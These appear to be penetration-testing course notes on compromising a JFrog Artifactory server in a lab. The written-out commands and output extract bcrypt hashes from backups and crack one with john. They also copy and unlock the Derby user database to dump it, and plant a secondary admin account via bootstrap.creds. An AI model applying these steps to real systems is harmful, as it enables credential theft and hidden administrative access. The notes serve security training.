Artifactory is a “binary repository manager” that stores software packages and other binaries.

Binary repository managers act as a “single source of truth” for organizations to be able to control which versions of packages and applications are being used in software development or infrastructure configuration. This prevents developers from getting untrusted or unstable binaries directly from the Internet.

We can start artifactory as a daemon:
```bash
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
2020-06-01T14:24:17.138Z [shell] [INFO ] [][installerCommon.sh:1162 ] [main] -
Checking open files and processes limits
2020-06-01T14:24:17.157Z [shell] [INFO ] [] [installerCommon.sh:1165 ] [main] -
Current max open files is 1024
...
Using JRE_HOME: /opt/jfrog/artifactory/app/third-party/java
Using CLASSPATH:
/opt/jfrog/artifactory/app/artifactory/tomcat/bin/bootstrap.jar:/opt/jfrog/artifactory
/app/artifactory/tomcat/bin/tomcat-juli.jar
Using CATALINA_PID: /opt/jfrog/artifactory/app/run/artifactory.pid
Tomcat started.
```

We can locate a general repository for generic binaries called "generic-local":
![[Pasted image 20230620231442.png]]

The Set Me Up button at the top right of the page gives information about how to use Curl to upload and download binaries to the repository.

There is also a Deploy button that will let us upload files to the repository and specify the paths we want users to access to download them.

Clicking on generic-local expands the tree where we find a “vi” artifact listed. If we click on it, we can inspect various statistics about the file, such as the download path, who it was deployed by, when it was created and last modified, and how many times it’s been downloaded.

![[Pasted image 20230620231550.png]]

# Compromising Artifactory Backups

We have two options to use the database to compromise Artifactory. The first is through backups. Depending on the configuration, Artifactory creates backups of its databases. The open-source version of Artifactory creates database backups for the user accounts at `/<ARTIFACTORY FOLDER>/var/backup/access` in JSON format:
```json
root@controller:/opt/jfrog/artifactory/var/backup/access# cat
access.backup.20200730120454.json
...
{
	"username" : "developer",
	"firstName" : null,
	"lastName" : null,
	"email" : "developer@corp.local",
	"realm" : "internal",
	"status" : "enabled",
	"lastLoginTime" : 0,
	"lastLoginIp" : null,
	"password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
	"allowedIps" : [ "*" ],
	"created" : 1591715957889,
	"modified" : 1591715957889,
	"failedLoginAttempts" : 0,
	"statusLastModified" : 1591715957889,
	"passwordLastModified" : 1591715957889,
	"customData" : {
	"updatable_profile" : {
	"value" : "true",
	"sensitive" : false
}
...
```

We can crack the hash using john:
```bash
kali@kali:~$ sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123 (?)
...
```

# Compromising Artifactory's Database

The open-source version of Artifactory we’re using locks its Derby database while the server is running. We could attempt to remove the locks and access the database directly to inject users, but this is risky and often leads to corrupted databases. A safer option is to copy the entire database to a new location.

The database containing the user information is located at
`/opt/jfrog/artifactory/var/data/access/derby`.

We can now copy the database into /tmp and remove the lock:
```bash
offsec@controller:~$ mkdir /tmp/hackeddb
offsec@controller:~$ sudo cp -r /opt/jfrog/artifactory/var/data/access/derby
/tmp/hackeddb
offsec@controller:~$ sudo chmod 755 /tmp/hackeddb/derby
offsec@controller:~$ sudo rm /tmp/hackeddb/derby/*.lck
```

The `ij` command line tool, which allows the user to access a Derby database and perform queries against it:
```bash
offsec@controller:~$ sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij version 10.15
ij> connect 'jdbc:derby:/tmp/hackeddb/derby';
ij>
```

The first part of the command calls the embedded version of Java included as part of Artifactory. We’re specifying that we want to run the derbyrun.jar JAR file. The ij parameter indicates that we want to use Apache’s ij tool to access the database.

Now we can dump the database:
```bash
ij> select * from access_users;
USER_ID |USERNAME |PASSWORD |ALLOWED_IPS |CREATED |MODIFIED |FIRSTNAME |LASTNAME
|EMAIL |REALM |STATUS |LAST_LOGIN_TIME |LAST_LOGIN_IP |FAILED_ATTEMPTS
|STATUS_LAST_MODIFIED| PASSWORD_LAST_MODIF&
...
1 |admin |bcrypt$$2a$08$3gNs9Gm4wqY5ic/2/kFUn.S/zYffSCMaGpshXj/f/X0EMK.ErHdp2
|127.0.0.1 |1591715727140 |1591715811546 |NULL |NULL |NULL |internal |enabled
|1596125074382 |192.168.118.5 |0 |1591715811545 |1591715811545
...
3 |developer |bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm |* |1591715957889 |1591715957889 |NULL |NULL |developer@corp.local |internal |enabled |0
|NULL |0 |1591715957889 |1591715957889
3 rows selected
ij>
```

# Adding a Secondary Artifactory Admin Account

This method requires write access to the /opt/jfrog/artifactory/var/etc/access folder and the ability to change permissions on the newly-created file, which usually requires root or sudo access.

We’ll log in to the controller server as offsec and navigate to the
`/opt/jfrog/artifactory/var/etc/access` folder. We then need to create a file through sudo called `bootstrap.creds` with the following content.
```
haxmin@*=haxhaxhax
```

This will create a new user called “haxmin” with a password of “haxhaxhax”. Next, we’ll need to chmod the file to 600.
```bash
offsec@controller:/opt/jfrog$ sudo chmod 600
/opt/jfrog/artifactory/var/etc/access/bootstrap.creds
```

Now we restart artifactory:
```bash
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
Using the default catalina management port (8015) to test shutdown
Stopping Artifactory Tomcat...
...
router is running (PID: 12434). Stopping it...
router stopped
offsec@controller:/opt/jfrog$ sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
2020-06-01T14:38:16.769Z [shell] [INFO ] [] [installerCommon.sh:1162 ] [main] -
Checking open files and processes limits
2020-06-01T14:38:16.785Z [shell] [INFO ] [] [installerCommon.sh:1165 ] [main] -
Current max open files is 1024
...
Using CATALINA_PID: /opt/jfrog/artifactory/app/run/artifactory.pid
Tomcat started.
```

Once Artifactory is running again, we can log in with our newly-created account.
![[Pasted image 20230620232931.png]]

